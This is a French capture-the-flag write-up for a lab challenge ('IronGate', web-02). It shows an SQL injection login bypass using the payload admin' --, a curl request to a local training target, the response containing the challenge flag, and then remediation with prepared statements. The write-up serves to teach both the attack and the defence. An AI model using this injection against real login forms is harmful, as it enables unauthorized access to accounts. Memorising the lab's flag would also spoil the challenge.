# Writeup : IronGate Auth Bypass (web-02-sqli-login)

## 1. Contexte & Vulnérabilité
La faille d'injection SQL sur formulaire d'authentification survient lorsque le serveur web construit la requête SQL en concaténant directement les entrées utilisateur sans assainissement ni utilisation de requêtes préparées.
Le code vulnérable ressemble à :
```sql
SELECT id, username, role, api_key FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';
```

## 2. Exploitation Pas à Pas

### Étape 1 : Analyse de la syntaxe
Si l'on envoie dans le champ `username` la valeur :
```text
admin' --
```
La requête exécutée par la base de données devient :
```sql
SELECT id, username, role, api_key FROM users WHERE username = 'admin' --' AND password = '...';
```
Tout ce qui se trouve après `--` est considéré comme un commentaire et ignoré par le moteur SQL (SQLite, MySQL, PostgreSQL).
Le moteur vérifie donc uniquement si l'utilisateur `admin` existe, sans exiger de mot de passe valide !

### Étape 2 : Envoi de la charge utile via curl
```bash
curl -X POST http://127.0.0.1:3333/targets/training/web-02/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "randompassword"}'
```

**Réponse reçue :**
```json
{
  "success": true,
  "role": "SuperAdministrator",
  "welcome": "Accès Administrateur Déverrouillé.",
  "flag": "CYBERLAB{SQLI_AUTH_BYPASS_IRON_GATE_CLEARED}"
}
```

## 3. Remédiation
Pour contrer cette vulnérabilité, il est obligatoire d'utiliser des **requêtes préparées (Prepared Statements)** avec des paramètres typés :
```javascript
// Exemple sécurisé en Node.js / SQLite
const stmt = db.prepare('SELECT id, username, role FROM users WHERE username = ? AND password = ?');
const user = stmt.get(inputUsername, hashedInputPassword);
```
Dans ce mode, la base de données traite les variables comme de pures valeurs littérales et jamais comme du code exécutable.
